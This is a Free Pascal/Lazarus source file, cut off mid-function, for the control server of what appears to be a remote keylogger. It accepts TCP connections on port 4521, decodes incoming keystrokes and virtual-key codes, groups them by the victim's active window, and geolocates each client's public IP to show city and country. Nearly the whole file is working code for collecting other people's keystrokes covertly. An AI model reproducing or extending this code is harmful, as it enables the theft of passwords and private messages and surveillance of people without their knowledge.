unit MainUnit;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, FileUtil, RichMemo, Forms, Controls, Graphics, Dialogs,
  ExtCtrls, ComCtrls, StdCtrls, Menus, IdTCPServer, IdGlobal, IdContext,
  IdIOHandler, IdStack, IdSocketHandle, IdSync, IdThread, Variants, IdHTTP,
  ComObj, Windows, BCLabel, BCPanel, FXMaterialButton, UtilsUnit, DateUtils, RichMemoUtils;


type
TConnectedClient = class
  InternalIP: string;
  ExternalIP: string;
  Country: string;
  City: string;
end;

TConnectedClientArray = array of TConnectedClient;

TRichMemoArray = array of TRichMemo;


TClientTab = class
    ClientIP: string;
    CurrInputWindowName: wideString;
    CurrInputStr: wideString; // reset by timer
    WindowMemos: TRichMemoArray; // memo for each window
    ClientScrollBox: TScrollBox; // group box where everything (like memos and shit) is contained


    procedure AddMemo(newMemoWindowName: wideString);

    Constructor Create(newClientIP: string; var connectionTabsFromForm: TTabControl);
    Destructor Free;
  end;


TClientTabArray = array of TClientTab;

{ TServerSideForm }

TServerSideForm = class(TForm)
    ApplyButton: TButton;
    City: TLabeledEdit;
    ClearLogItem: TMenuItem;
    ClientPopup: TPopupMenu;
    CloseInfoPanelLabel: TLabel;
    ConnectionSettingsGroupBox: TGroupBox;
    ConnectionsPanel: TBCPanel;
    ConnectionTabs: TTabControl;
    Country: TLabeledEdit;
    ExternalIP: TLabeledEdit;
    FontDialog: TFontDialog;
    FontSettingsGroupBox: TGroupBox;
    GetInfoItem: TMenuItem;
    HugeGapLabel: TLabel;
    HugeKeystrokeAreaLabel: TLabel;
    InfoPanel: TPanel;
    InternalIP: TLabeledEdit;
    KeystrokeAreaBar: TTrackBar;
    KeystrokeAreaSizeLabel: TLabel;
    LogPanel: TBCPanel;
    HomePanel: TBCPanel;
    LogText: TMemo;
    LogTextPopup: TPopupMenu;
    MaxConnectionsEdit: TEdit;
    MaxConnectionsLabel: TLabel;
    NewLineIntervalEdit: TEdit;
    NewLineIntervalLabel: TLabel;
    NewLineTimer: TTimer;
    SettingsGroupBox: TGroupBox;
    SettingsPanel: TBCPanel;
    SmallGapLabel: TLabel;
    SmallKeystrokeAreaLabel: TLabel;
    UnhidePanel: TBCPanel;
    HideControlPanelLabel: TBCLabel;
    UnhideControlPanelLabel: TBCLabel;
    ControlPanel: TBCPanel;
    MainPanel: TBCPanel;
    LogButton: TFXMaterialButton;
    Separator1: TShape;
    Separator2: TShape;
    StartButton: TFXMaterialButton;
    SettingsButton: TFXMaterialButton;
    ConnectionsButton: TFXMaterialButton;
    ControlPanelHideTimer: TTimer;
    ControlPanelUnhideTimer: TTimer;
    WindowGapBar: TTrackBar;
    WindowGapLabel: TLabel;

    procedure ConnectionsButtonClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var CloseAction: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormResize(Sender: TObject);
    procedure UnhideControlPanelLabelClick(Sender: TObject);
    procedure HideControlPanelLabelClick(Sender: TObject);
    procedure LogButtonClick(Sender: TObject);
    procedure ControlPanelUnhideTimerTimer(Sender: TObject);
    procedure SettingsButtonClick(Sender: TObject);
    procedure StartButtonMouseEnter(Sender: TObject);
    procedure StartButtonMouseLeave(Sender: TObject);

    procedure StopStartButtonClick(Sender: TObject);

    procedure OnExecuteServer(Context: TIdContext);
    procedure OnConnectServer(Context: TIdContext);
    procedure OnDisconnectServer(Context: TIdContext);
    procedure ControlPanelHideTimerTimer(Sender: TObject);
    procedure WindowFrameShapeMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure WindowFrameShapeMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure WindowFrameShapeMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);

    // Other
    procedure AddConnectedClient(CityStr: string; CountryStr: string; InternalIPStr: string; ExternalIPStr: string);
    procedure DeleteClient(var Arr: TConnectedClientArray; const Index: longInt);

    procedure UnShowAllMainPanels();




    // Connections
    procedure CloseInfoPanelLabelClick(Sender: TObject);
    procedure CloseInfoPanelLabelMouseEnter(Sender: TObject);
    procedure CloseInfoPanelLabelMouseLeave(Sender: TObject);
    procedure ConnectionTabsChange(Sender: TObject);
    procedure GetInfoItemClick(Sender: TObject);
    procedure NewLineTimerTimer(Sender: TObject);

    procedure SetClientInputWindow(tabName: wideString; newWindow: wideString);
    function GetClientInputWindow(tabName: wideString): wideString;

    function AddTab(tabName: wideString): boolean;
    procedure RemoveTab(tabName: wideString);

    procedure AddStrToCorrectTab(tabName: wideString; str: wideString; needNewLine: boolean; windowName: wideString);





    // Log
    procedure ClearLogItemClick(Sender: TObject);
    procedure LogToForm(str: wideString);




    // Settings
    procedure ApplyButtonClick(Sender: TObject);
    procedure KeystrokeAreaBarChange(Sender: TObject);
    procedure MaxConnectionsEditChange(Sender: TObject);
    procedure NewLineIntervalEditChange(Sender: TObject);
    procedure WindowGapBarChange(Sender: TObject);

  private
    { private declarations }
  public
    { public declarations }
    TCPServer: TIdTCPServer;

    ConnectedClients: TConnectedClientArray;

    TransmittingIPs: stringArray;

    ClientTabsArray: TClientTabArray;

    currVisibleClientTab: longInt;


    // fonts for different ocasions
    RegularTextFont: TFontParams; // letters and numbers and stuff
    SpecialTextFont: TFontParams; // ctrl shift
    HeaderTextFont: TFontParams; // name of the window at the top of the memo
    TimerTextFont: TFontParams;
  end;


ConnectSync = class(TIdSync)
  protected
    procedure DoSynchronize; override;
  public
    context: TIdContext;
  end;

ConnectThread = class (TThread)
  protected
    procedure Execute; override;
  public
    sync: ConnectSync;
    Constructor Create(CreateSuspended : boolean);
  end;



DisconnectSync = class(TIdSync)
  protected
    procedure DoSynchronize; override;
  public
    PeerIP: string;
  end;

DisconnectThread = class (TThread)
 protected
   procedure Execute; override;
 public
   sync: DisconnectSync;
   Constructor Create(CreateSuspended : boolean);
 end;



ExecSync = class(TIdSync)
  protected
    procedure DoSynchronize; override;
  public
    context: TIdContext;
    isTransmittingInfo: boolean;
    finishedTransmittingInfo: boolean;
  end;

ExecuteThread = class (TThread)
 protected
   procedure Execute; override;
 public
   sync: ExecSync;
   Constructor Create(CreateSuspended : boolean);
 end;


const
  animationSpeed = 0.075; // recommended 0.035 - 0.06

var
  ServerSideForm: TServerSideForm;

  // GUI
  prevMouseX, prevMouseY: longInt;
  windowBeingDragged: boolean;

  // TESTING HIDE/UNHIDE
  hideStart, hideEnd, hideCurr: longInt;
  hideAnimVal: Double;

  unhideButtonStart, unhideButtonEnd, unhideButtonCurr: longInt;
  unhideButtonAnimVal: Double;

  speedMult: Double;

implementation

{$R *.lfm}

{ TServerSideForm }

procedure TServerSideForm.AddConnectedClient(CityStr: string; CountryStr: string; InternalIPStr: string; ExternalIPStr: string);
var
  tempClient: TConnectedClient;
begin
  tempClient := TConnectedClient.Create;

  tempClient.City:=CityStr;
  tempClient.Country := CountryStr;
  tempClient.InternalIP := InternalIPStr;
  tempClient.ExternalIP := ExternalIPStr;

  SetLength(ConnectedClients, Length(ConnectedClients)+1);
  ConnectedClients[Length(ConnectedClients)-1] := tempClient;
end;

procedure TServerSideForm.DeleteClient(var Arr: TConnectedClientArray; const Index: longInt);
var
  len: longInt;
  i: longInt;
begin
  len := Length(Arr);

  Assert((Index > 0) and (Index < len-1), 'Error while deleting an edit! Deleted index was: ' + IntToStr(Index));

  Arr[Index].Free;

  for i:=Index+1 to len-1 do
  begin
    Arr[i-1] := Arr[i];
  end;

  SetLength(Arr, len - 1);
end;

procedure TServerSideForm.UnShowAllMainPanels();
begin
  ConnectionsPanel.Visible:=false;
  LogPanel.Visible:=false;
  SettingsPanel.Visible:=false;
  HomePanel.Visible:=false;
end;

procedure TServerSideForm.StopStartButtonClick(Sender: TObject);
begin
  if (TCPServer.Active) then
  begin
    TCPServer.Active:=false;
    (Sender as TFXMaterialButton).Caption := 'START';
    LogToForm('Server stopped');
  end
  else
  begin
    TCPServer.Active:=true;
    (Sender as TFXMaterialButton).Caption := 'STOP';
    LogToForm('Server started on ' + TCPServer.Bindings[0].IP + ':' + IntToStr(TCPServer.Bindings[0].Port));
  end;
end;

procedure TServerSideForm.OnExecuteServer(Context: TIdContext);
var
  execThr: ExecuteThread;
begin
//
  execThr := ExecuteThread.Create(true);
  execThr.sync.context := Context;
  execThr.sync.isTransmittingInfo := false;
  execThr.sync.finishedTransmittingInfo := true;
  try
    execThr.Start;
  finally
    //execThr.Free;
  end;

  IndySleep(50);
end;

procedure TServerSideForm.OnConnectServer(Context: TIdContext);
var
  connectThr: ConnectThread;
begin
  connectThr := ConnectThread.Create(true);
  connectThr.sync.context := Context;
  try
    connectThr.Start;
  finally
    //connectThr.Free;
  end;
end;

procedure TServerSideForm.OnDisconnectServer(Context: TIdContext);
var
  disconnectThr: DisconnectThread;
begin
  disconnectThr := DisconnectThread.Create(true);
  disconnectThr.sync.PeerIP := Context.Binding.PeerIP;
  try
    disconnectThr.Start;
  finally
    //disconnectThr.Free;
  end;
end;

procedure TServerSideForm.ControlPanelHideTimerTimer(Sender: TObject);
begin
  if (hideAnimVal < 1) then
  begin
    ControlPanelUnhideTimer.Enabled:=false;
    hideAnimVal := hideAnimVal + (animationSpeed * speedMult);
    unhideButtonAnimVal := unhideButtonAnimVal + (animationSpeed * speedMult);
  end
  else
  begin
    ControlPanelHideTimer.Enabled:=false;
  end;

  hideCurr := Round(CosineInterpolation(hideStart, hideEnd, hideAnimVal));
  unhideButtonCurr := Round(CosineInterpolation(unhideButtonStart, unhideButtonEnd, unhideButtonAnimVal));

  ControlPanel.Width:=hideCurr;
  UnhidePanel.Left:=unhideButtonCurr;
end;

procedure TServerSideForm.WindowFrameShapeMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
  // begin drag
  windowBeingDragged := true;
  prevMouseX := X;
  prevMouseY := Y;
end;

procedure TServerSideForm.WindowFrameShapeMouseMove(Sender: TObject;
  Shift: TShiftState; X, Y: Integer);
var
  diffX, diffY: longInt;
begin
  if (windowBeingDragged) then
  begin
    diffX := X - prevMouseX;
    diffY := Y - prevMouseY;
    ServerSideForm.Top := ServerSideForm.Top + diffY;
    ServerSideForm.Left := ServerSideForm.Left + diffX;
  end;
end;

procedure TServerSideForm.WindowFrameShapeMouseUp(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
  windowBeingDragged := false;
end;

procedure TServerSideForm.FormCreate(Sender: TObject);
var
  SocketHandle: TIdSocketHandle;
begin
  TCPServer := TIdTCPServer.Create();

  TCPServer.Bindings.Clear;
  SocketHandle := TCPServer.Bindings.Add;

  TIdStack.IncUsage;
  SocketHandle.IP := GStack.LocalAddress;
  SocketHandle.Port := 4521;
  TIdStack.DecUsage;

  TCPServer.MaxConnections:=30;

  TCPServer.OnExecute:=@OnExecuteServer;
  TCPServer.OnConnect:=@OnConnectServer;
  TCPServer.OnDisconnect:=@OnDisconnectServer;


  // OTHER
  hideStart := 240;
  hideEnd := 0;
  hideCurr := hideStart;
  hideAnimVal := 0;

  unhideButtonStart := -24;
  unhideButtonEnd := 0;
  unhideButtonCurr := unhideButtonStart;
  unhideButtonAnimVal := 0;

  currVisibleClientTab := -1;


  ConnectionTabs.Color:=clWhite;


  // FONTS

  RegularTextFont.HasBkClr:=false;
  RegularTextFont.Color:=RGBToColor(25,25,25);
  RegularTextFont.Name:='Verdana';
  RegularTextFont.Size:=11;
  RegularTextFont.Style:=[];

  SpecialTextFont.HasBkClr:=false;
  SpecialTextFont.Color:=RGBToColor(190,190,190); // might want to make this a constant
  SpecialTextFont.Name:='Verdana';
  SpecialTextFont.Size:=9;
  SpecialTextFont.Style:=[];

  HeaderTextFont.HasBkClr:=false;
  HeaderTextFont.Color:=RGBToColor(25,25,25);
  HeaderTextFont.Name:='Tahoma';
  HeaderTextFont.Size:=15;
  HeaderTextFont.Style:=[fsItalic];

  TimerTextFont.HasBkClr:=false;
  TimerTextFont.Color:=RGBToColor(155,155,155);
  TimerTextFont.Name:='Yu Gothic';
  TimerTextFont.Size:=9;
  TimerTextFont.Style:=[];
end;

procedure TServerSideForm.FormResize(Sender: TObject);
begin
  speedMult := (ServerSideForm.Width + ServerSideForm.Height)/(Screen.Width + Screen.Height);

  //ServerSideForm.Caption:=FloatToStr(speedMult);

  if (ControlPanel.Width = 0) then
  begin
    UnHidePanel.Left:=0;
  end
  else
  begin
    UnHidePanel.Left:=unhideButtonCurr;
  end;
end;

procedure TServerSideForm.UnhideControlPanelLabelClick(Sender: TObject);
begin
  ControlPanelUnhideTimer.Enabled:=true;
end;

procedure TServerSideForm.HideControlPanelLabelClick(Sender: TObject);
begin
  ControlPanelHideTimer.Enabled:=true;
end;


procedure TServerSideForm.LogButtonClick(Sender: TObject);
begin
  UnShowAllMainPanels;

  LogPanel.Visible := true;
end;

procedure TServerSideForm.ControlPanelUnhideTimerTimer(Sender: TObject);
begin
  if (hideAnimVal > 0) then
  begin
    ControlPanelHideTimer.Enabled:=false;
    hideAnimVal := hideAnimVal - (animationSpeed * speedMult);
    unhideButtonAnimVal := unhideButtonAnimVal - (animationSpeed * speedMult);
  end
  else
  begin
    ControlPanelUnhideTimer.Enabled:=false;
  end;

  hideCurr := Round(CosineInterpolation(hideStart, hideEnd, hideAnimVal));
  unhideButtonCurr := Round(CosineInterpolation(unhideButtonStart, unhideButtonEnd, unhideButtonAnimVal));

  ControlPanel.Width:=hideCurr;
  UnhidePanel.Left:=unhideButtonCurr;
end;

procedure TServerSideForm.SettingsButtonClick(Sender: TObject);
begin
  // Open settings form
  UnShowAllMainPanels;
  SettingsPanel.Visible:=true;
end;

procedure TServerSideForm.StartButtonMouseEnter(Sender: TObject);
begin
  (Sender as TFXMaterialButton).NormalColor:=RGBToColor(34,38,43);
end;

procedure TServerSideForm.StartButtonMouseLeave(Sender: TObject);
begin
  (Sender as TFXMaterialButton).NormalColor:=RGBToColor(17,23,23);
end;

procedure TServerSideForm.FormClose(Sender: TObject; var CloseAction: TCloseAction);
begin
  if (TCPServer.Active) then
  begin
    TCPServer.Active := false;
  end;
end;

procedure TServerSideForm.ConnectionsButtonClick(Sender: TObject);
begin
  UnShowAllMainPanels;
  ConnectionsPanel.Visible:=true;
end;







// CONNECT/DISCONNECT/EXECUTE THREAD, SYNCS




{CONNECT}
procedure ConnectSync.DoSynchronize;
begin
  ServerSideForm.LogToForm(Context.Binding.PeerIP + ' is connecting to the server');
  //LogForm.LogToForm(geoXml);
end;

constructor ConnectThread.Create(CreateSuspended : boolean);
begin
  FreeOnTerminate := True;
  sync := ConnectSync.Create;

  inherited Create(CreateSuspended);
end;

procedure ConnectThread.Execute;
begin
  try
    sync.Synchronize;
  finally
    sync.Free;
  end;
end;
 {/CONNECT}


 {DISCONNECT}
procedure DisconnectSync.DoSynchronize;
var
  i, deleteIndx: longInt;
begin
  ServerSideForm.LogToForm(PeerIP + ' has disconnected from the server');

  for i:=0 to ServerSideForm.ConnectionTabs.Tabs.Count-1 do
  begin
    if (ServerSideForm.ConnectionTabs.Tabs[i] = PeerIP) then
    begin
      deleteIndx := i;
      break;
    end;
  end;
  ServerSideForm.DeleteClient(ServerSideForm.ConnectedClients, deleteIndx);

  ServerSideForm.RemoveTab(PeerIP);
end;

constructor DisconnectThread.Create(CreateSuspended : boolean);
begin
  FreeOnTerminate := True;
  sync := DisconnectSync.Create;
  inherited Create(CreateSuspended);
end;

procedure DisconnectThread.Execute;
begin
  try
    sync.Synchronize;
  finally
    sync.Free;
  end;
end;
 {/DISCONNECT}


 {EXECUTE}
procedure ExecSync.DoSynchronize;
var
  readInt64: Int64;
  keyPressed: wideChar;

  geoStr: string;
  geoHttp: TIdHTTP;

  publicIP: wideString = '';

  City, Country, InternalIP, ExternalIP: string;

  windowInfo: wideString;

  decodedVkCode: longInt;

  lineToRead: wideString;

  i,j: longInt;

label
  InfoTransmission;

begin
  //LogForm.LogToForm('Triggered');
  for j:=0 to Length(ServerSideForm.TransmittingIPs)-1 do
  begin
    if (ServerSideForm.TransmittingIPs[j] = Context.Binding.IP) then
    begin
      goto InfoTransmission;
    end;
  end;

  if not(Context.Connection.IOHandler.InputBufferIsEmpty) then
  begin
    readInt64 := Context.Connection.IOHandler.ReadInt64(true);

    //LogForm.LogToForm('Got: ' + IntToStr(readInt64));
          // check if the sent key is decoded as non printable and process it if it is (decoded - high order bit is 1)
    keyPressed := wideChar(readInt64);

    if (readInt64 = 1337) then // open bracket, possible IP or INFO reading
    begin
      SetLength(ServerSideForm.TransmittingIPs, Length(ServerSideForm.TransmittingIPs)+1);
      ServerSideForm.TransmittingIPs[Length(ServerSideForm.TransmittingIPs)-1] := Context.Binding.IP;
      // wait for info or ip
      //IndySleep(500);
InfoTransmission:

      while not(Context.Connection.IOHandler.InputBufferIsEmpty) do
      begin
        //LogForm.LogToForm('Reading an info packet from ' + Context.Binding.PeerIP);

        readInt64 := Context.Connection.IOHandler.ReadInt64(true);
        keyPressed := wideChar(readInt64);

        if (readInt64 = 1338) then
        begin
          // transmission over
          for j:=0 to Length(ServerSideForm.TransmittingIPs)-1 do
          begin
            if (ServerSideForm.TransmittingIPs[j] = Context.Binding.IP) then
            begin
              DeleteStringFromStringArray(ServerSideForm.TransmittingIPs, j);
            end;
          end;

          exit;
        end;

        while (readInt64 <> 1338) do
        begin
          lineToRead := lineToRead + keyPressed;

          readInt64 := Context.Connection.IOHandler.ReadInt64(true);
          keyPressed := wideChar(readInt64);

          if (readInt64 = 1338) then
          begin
            for j:=0 to Length(ServerSideForm.TransmittingIPs)-1 do
            begin
              if (ServerSideForm.TransmittingIPs[j] = Context.Binding.IP) then
              begin
                DeleteStringFromStringArray(ServerSideForm.TransmittingIPs, j);
              end;
            end;

            break;
          end;
        end;

        if (Pos('clientIp', lineToRead)>0) then
        begin
          //Read IP

          for i:=11 to Length(lineToRead) do
          begin
            publicIP := publicIP + lineToRead[i];
          end;

          geoHttp := TIdHTTP.Create;
          geoStr := geoHttp.Get('http://freegeoip.net/xml/' + string(publicIP));

          //LogForm.LogToForm('Connection on ' + string(publicIP) + ' is from: ' + geoStr);

          InternalIP := string(Context.Binding.PeerIP);
          ExternalIP := string(publicIP);
          City := ExtractTag(geoStr, '<City>');
          Country := ExtractTag(geoStr, '<CountryName>');

          ServerSideForm.AddConnectedClient(City, Country, InternalIP, ExternalIP);
          if not(ServerSideForm.AddTab(Context.Binding.PeerIP)) then
          begin
            // Too many connections
            //showMessage('Too many connections! Your current limit is: ' + SettingsForm.MaxConnectionsEdit.Text);
            ServerSideForm.LogToForm('Client on ' + ExternalIP + ' could not connect to the server!');
            Context.Connection.Disconnect(true);
            exit;
          end;

          ServerSideForm.LogToForm('Client on ' + ExternalIP + ' (' + InternalIP + ') has succesfully connected to the server');

          Context.Connection.IOHandler.InputBuffer.Clear;
        end
        else if (Pos('windowInfo',lineToRead)>0) then
        begin
          // read info about widnow
          //ServerSideForm.LogToForm('Getting window info: ' + lineToRead);
          for i:=13 to Length(lineToRead) do
          begin
            windowInfo := windowInfo + lineToRead[i];
          end;
          //ServerSideForm.LogToForm('Extracted: ' + windowInfo);

          // info about input window is containted in windowInfo, do something useful with it
          //LogForm.LogToForm('Setting client window to ' + windowInfo);
          ServerSideForm.SetClientInputWindow(Context.Binding.PeerIP, windowInfo);
          //LogForm.LogToForm('Client window is now ' + ConnectionsForm.GetClientInputWindow(Context.Binding.PeerIP));

          //LogForm.LogToForm('Sending packet ' + string(keypressed) + ' to ' + ConnectionsForm.GetClientInputWindow(Context.Binding.PeerIP) + ' memo');
          while not(Context.Connection.IOHandler.InputBufferIsEmpty) do
          begin
            keyPressed := wideChar(Context.Connection.IOHandler.ReadInt64(true));
            ServerSideForm.AddStrToCorrectTab(Context.Binding.PeerIP, string(keyPressed), false, ServerSideForm.GetClientInputWindow(Context.Binding.PeerIP));
          end;
        end
        else
        begin
          //for i:=1 to Length(lineToRead)
        end;

        //LogForm.LogToForm('Finished reading a packet marked as <' + specialString + '> from ' + Context.Binding.PeerIP);
        //specialString := '';
      end;

    end
    else
    begin
      if (readInt64 and (1 << 63) = (1 << 63)) then
      begin
        decodedVkCode := 0;
        decodedVkCode := decodedVkCode or (((readInt64 xor (1 << 63))) >> (63-8));

        if (decodedVkCode = VK_SPACE) then
        begin
          ServerSideForm.AddStrToCorrectTab(Context.Binding.PeerIP, ' ', false, ServerSideForm.GetClientInputWindow(Context.Binding.PeerIP)); // get last user input window (on peerip tab)
        end
        else if (decodedVkCode <> VK_LSHIFT) and (decodedVkCode <> VK_RSHIFT) then
        begin
          ServerSideForm.AddStrToCorrectTab(Context.Binding.PeerIP, ' [' + getAppropriateStringForVirtualKey(decodedVkCode) + '] ', false, ServerSideForm.GetClientInputWindow(Context.Binding.PeerIP));
        end;
      end
      else
      begin
        ServerSideForm.AddStrToCorrectTab(Context.Binding.PeerIP, string(keyPressed), false, ServerSideForm.GetClientInputWindow(Context.Binding.PeerIP));
      end;
    end;

  end;


  //
end;

constructor ExecuteThread.Create(CreateSuspended : boolean);
begin
  FreeOnTerminate := True;
  sync := ExecSync.Create;
  inherited Create(CreateSuspended);
end;

procedure ExecuteThread.Execute;
begin
  try
    sync.Synchronize;
  finally
    sync.Free;
  end;
end;
 {/EXECUTE}









 // CONNECTIONS

procedure TClientTab.AddMemo(newMemoWindowName: wideString);
var
  tempMemo: TRichMemo;

  timeForward: TDateTime;
begin
  tempMemo := TRichMemo.Create(ClientScrollBox);
  tempMemo.Parent := ClientScrollBox;

  // add a new memo and anchor it to the top memo

  tempMemo.Anchors:=[akLeft,akRight,akTop];

  tempMemo.AnchorSide[akLeft].Side := asrLeft;
  tempMemo.AnchorSide[akLeft].Control := ClientScrollBox;

  tempMemo.AnchorSide[akRight].Side := asrRight;
  tempMemo.AnchorSide[akRight].Control := ClientScrollBox;

  if (Length(WindowMemos) = 0) then
  begin
    // anchor to top of scroll box
    tempMemo.AnchorSide[akTop].Side := asrTop;
    tempMemo.AnchorSide[akTop].Control := ClientScrollBox;
  end
  else
  begin
    // anchor to bottom of last memo
    tempMemo.AnchorSide[akTop].Side := asrBottom;
    tempMemo.AnchorSide[akTop].Control := WindowMemos[Length(WindowMemos)-1];
  end;

  tempMemo.BorderSpacing.Top     := ServerSideForm.WindowGapBar.Position;
  tempMemo.BorderSpacing.Left    := 0;
  tempMemo.BorderSpacing.Right   := 0;

  tempMemo.Font.Quality:=fqCleartype;

  tempMemo.ScrollBars:=ssAutoBoth;
  tempMemo.WordWrap:=true;

  tempMemo.Color:=tempMemo.Parent.Color;

  tempMemo.Height := ServerSideForm.KeystrokeAreaBar.Position;

  InsertFontText(tempMemo, newMemoWindowName + sLineBreak + sLineBreak, ServerSideForm.HeaderTextFont, -1);

  timeForward := Time;
  timeForward := IncSecond(timeForward, ServerSideForm.NewLineTimer.Interval div 1000);

  InsertFontText(tempMemo, '[' + TimeToStr(Time) + ' - ' + TimeToStr(timeForward) + ']' + sLineBreak, ServerSideForm.TimerTextFont, -1);

  tempMemo.Hint := newMemoWindowName;
  //showMessage('New Hint: ' + tempMemo.Hint);
  tempMemo.Visible:=true;
  tempMemo.ReadOnly:=true;

  SetLength(WindowMemos, Length(WindowMemos)+1); // One more slot
  WindowMemos[Length(WindowMemos)-1] := tempMemo; // Add it
end;

constructor TClientTab.Create(newClientIP: string; var connectionTabsFromForm: TTabControl);
begin
  //Create groupBox and make it streach for connections form

  ClientScrollBox := TScrollBox.Create(ServerSideForm);

  ClientScrollBox.Anchors:=[akLeft,akRight,akTop,akBottom];

  ClientScrollBox.AnchorSide[akLeft].Side := asrLeft;
  ClientScrollBox.AnchorSide[akLeft].Control := connectionTabsFromForm;

  ClientScrollBox.AnchorSide[akRight].Side := asrRight;
  ClientScrollBox.AnchorSide[akRight].Control := connectionTabsFromForm;

  ClientScrollBox.AnchorSide[akTop].Side := asrTop;
  ClientScrollBox.AnchorSide[akTop].Control := connectionTabsFromForm;

  ClientScrollBox.AnchorSide[akBottom].Side := asrBottom;
  ClientScrollBox.AnchorSide[akBottom].Control := connectionTabsFromForm;


  ClientScrollBox.BorderSpacing.Top     := 6;
  ClientScrollBox.BorderSpacing.Bottom  := 6;
  ClientScrollBox.BorderSpacing.Left    := 6;
  ClientScrollBox.BorderSpacing.Right   := 6;

  ClientScrollBox.AutoScroll:=true;

  ClientScrollBox.VertScrollBar.Increment:=4;
  ClientScrollBox.VertScrollBar.Smooth:=true;
  ClientScrollBox.VertScrollBar.Tracking:=true;

  ClientScrollBox.HorzScrollBar.Increment:=4;
  ClientScrollBox.HorzScrollBar.Smooth:=true;
  ClientScrollBox.HorzScrollBar.Tracking:=true;

  //ClientGroupBox.Caption:=IntToStr(TESTING);
  //Inc(TESTING);

  ClientScrollBox.Parent := connectionTabsFromForm;

  ClientScrollBox.Color:=ClientScrollBox.Parent.Color;

  ClientIP := newClientIP;
end;

Destructor TClientTab.Free;
var
  i: longInt;
begin
  //showMessage('?');
  for i:=0 to Length(WindowMemos)-1 do
  begin
    WindowMemos[i].Destroy;
  end;

  ClientScrollBox.Destroy;
end;

procedure DeleteTab(var Arr: TClientTabArray; const Index: longInt);
var
  len: longInt;
  i: longInt;
begin
  len := Length(Arr);

  Assert((Index > 0) and (Index < len-1), 'Error while deleting an edit! Deleted index was: ' + IntToStr(Index));

  Arr[Index].Free;

  for i:=Index+1 to len-1 do
  begin
    Arr[i-1] := Arr[i];
  end;

  SetLength(Arr, len - 1);

  if (Length(Arr) = 0) then
  begin
    ServerSideForm.NewLineTimer.Enabled:=false;
  end;
end;

procedure TServerSideForm.ConnectionTabsChange(Sender: TObject);
begin
  //showMessage('Current showing index: ' + IntToStr(ConnectionTabs.TabIndex));
  if (Length(ClientTabsArray) = 0) then
  begin
    exit;
  end;

  if (ConnectionTabs.TabIndex <> currVisibleClientTab) then
  begin
    // Change visisble edit
    ClientTabsArray[currVisibleClientTab].ClientScrollBox.Visible := false;
    currVisibleClientTab := ConnectionTabs.TabIndex;
    ClientTabsArray[currVisibleClientTab].ClientScrollBox.Visible := true;
  end;
end;

procedure TServerSideForm.SetClientInputWindow(tabName: wideString; newWindow: wideString);
var
  i: longInt;
begin
  // find client on tab tabName and set his window to newWindow
  ServerSideForm.LogToForm('Looking for: ' + newWindow + ' in tab ' + tabName);

  for i:=0 to Length(ClientTabsArray)-1 do
  begin
    if (ClientTabsArray[i].ClientIP = tabName) then
    begin
      ClientTabsArray[i].CurrInputWindowName:=newWindow; // add it to memos later
      break;
    end;
  end;
end;

function TServerSideForm.GetClientInputWindow(tabName: wideString): wideString;
var
  i: longInt;
begin
  // find client on tab tabName and return his window
  for i:=0 to Length(ClientTabsArray)-1 do
  begin
    if (ClientTabsArray[i].ClientIP = tabName) then
    begin
      result := ClientTabsArray[i].CurrInputWindowName;
      exit;
    end;
  end;
end;

procedure TServerSideForm.CloseInfoPanelLabelClick(Sender: TObject);
begin
  InfoPanel.Visible := false;
end;

procedure TServerSideForm.CloseInfoPanelLabelMouseEnter(Sender: TObject);
begin
  CloseInfoPanelLabel.Font.Color:=clGray;
end;

procedure TServerSideForm.CloseInfoPanelLabelMouseLeave(Sender: TObject);
begin
  CloseInfoPanelLabel.Font.Color:=clBlack;
end;

procedure TServerSideForm.GetInfoItemClick(Sender: TObject);
begin
  // show the info of the currently selected client
  if (currVisibleClientTab = -1) then
  begin
    exit;
  end;

  InternalIP.Text := MainUnit.ServerSideForm.ConnectedClients[currVisibleClientTab].InternalIP;
  ExternalIP.Text := MainUnit.ServerSideForm.ConnectedClients[currVisibleClientTab].ExternalIP;
  City.Text := MainUnit.ServerSideForm.ConnectedClients[currVisibleClientTab].City;
  Country.Text := MainUnit.ServerSideForm.ConnectedClients[currVisibleClientTab].Country;


  InfoPanel.Visible := true;
end;

procedure TServerSideForm.NewLineTimerTimer(Sender: TObject);
var
  i, j: longInt;
  timeForward: TDateTime;

  timerText: wideString;
begin
  // add a new time line on last active TMemo on a separate thread (later)
  timeForward := Time;
  timeForward := IncSecond(timeForward, ServerSideForm.NewLineTimer.Interval div 1000);

  for i:=0 to Length(ClientTabsArray)-1 do
  begin
    for j:=0 to Length(ClientTabsArray[i].WindowMemos)-1 do
    begin
      if (ClientTabsArray[i].WindowMemos[j].Hint = ClientTabsArray[i].CurrInputWindowName) and (ClientTabsArray[i].CurrInputStr <> '') then
      begin
        // this is the current active window, add timer text to it
        timerText := '[' + TimeToStr(Time) + ' - ' + TimeToStr(timeForward) + ']';

        InsertFontText(ClientTabsArray[i].WindowMemos[j], sLineBreak + sLineBreak + timerText + sLineBreak, TimerTextFont, -1);

        ClientTabsArray[i].CurrInputStr:='';
      end;
    end;
  end;
end;

function TServerSideForm.AddTab(tabName: wideString): boolean;  // Add new client
var
  tempClient: TClientTab;
begin

  if (Length(ClientTabsArray) = StrToInt(ServerSideForm.MaxConnectionsEdit.Text)) then
  begin
    Result := false;
    exit;
  end
  else
  begin
    Result := true;
  end;

  // Create the edit
  tempClient := TClientTab.Create(tabName, ConnectionTabs);

  // Add it to the array
  SetLength(ClientTabsArray, Length(ClientTabsArray)+1); // One more slot
  ClientTabsArray[Length(ClientTabsArray)-1] := tempClient; // Add it

  if (currVisibleClientTab = -1) then
  begin
    tempClient.ClientScrollBox.Visible := true;
    currVisibleClientTab := Length(ClientTabsArray)-1;
  end
  else
  begin
    tempClient.ClientScrollBox.Visible := false;
  end;

  // Switch the page
  ConnectionTabs.Tabs.Add(tabName);

  if (Length(ClientTabsArray) = 1) then
  begin
    NewLineTimer.Enabled:=true;
  end;
end;

procedure TServerSideForm.RemoveTab(tabName: wideString);
var
  i: longInt;
  tabWithNameIndx: longInt;
begin
  // Remove tab
  tabWithNameIndx := -1;

